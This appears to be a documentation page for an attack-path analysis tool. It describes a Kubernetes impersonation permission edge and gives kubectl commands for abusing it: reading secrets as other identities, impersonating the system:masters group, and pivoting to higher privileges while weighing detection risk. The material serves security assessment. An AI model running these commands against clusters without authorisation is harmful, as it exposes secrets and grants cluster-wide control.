# CH_canImpersonate

## Edge Schema

- **Source:** [CH_Identity](../NodeDescriptions/CH_Identity.md)
- **Target:** [CH_Namespace](../NodeDescriptions/CH_Namespace.md) / [CH_Cluster](../NodeDescriptions/CH_Cluster.md)

## General Information

The Identity holds `impersonate` permissions, allowing it to make API requests as other identities. Edge property `resource` indicates whether serviceaccounts, users, or groups can be impersonated. Points to Namespace if scoped, Cluster if cluster-wide.

## Abuse

Use the `--as` flag to make API requests as any user, group, or ServiceAccount within scope. Check what the impersonated identity can do and pivot to a higher-privileged one. Impersonation requests are logged under the impersonating identity's name in the audit log, not the target. Bear this in mind when assessing detection risk.

```bash
# Impersonate a ServiceAccount
kubectl get pods \
  --as=system:serviceaccount:<namespace>:<serviceaccount>

# Impersonate a user
kubectl get secrets -n <namespace> --as=<username>

# Check what the impersonated identity can do
kubectl auth can-i --list \
  --as=system:serviceaccount:<namespace>:<serviceaccount>

# Impersonate cluster-admin group
kubectl get secrets -A --as=fake --as-group=system:masters
```

## References

- [Kubernetes User Impersonation](https://kubernetes.io/docs/reference/access-authn-authz/authentication/#user-impersonation)
- [HackTricks - Abusing Roles/ClusterRoles in Kubernetes](https://cloud.hacktricks.wiki/en/pentesting-cloud/kubernetes-security/abusing-roles-clusterroles-in-kubernetes/index.html#impersonating-privileged-accounts)
- [OWASP K02 - Overly Permissive Authorization Configurations](https://owasp.org/www-project-kubernetes-top-ten/2025/en/src/K02-Overly-Permissive-Authorization-Configurations.html)
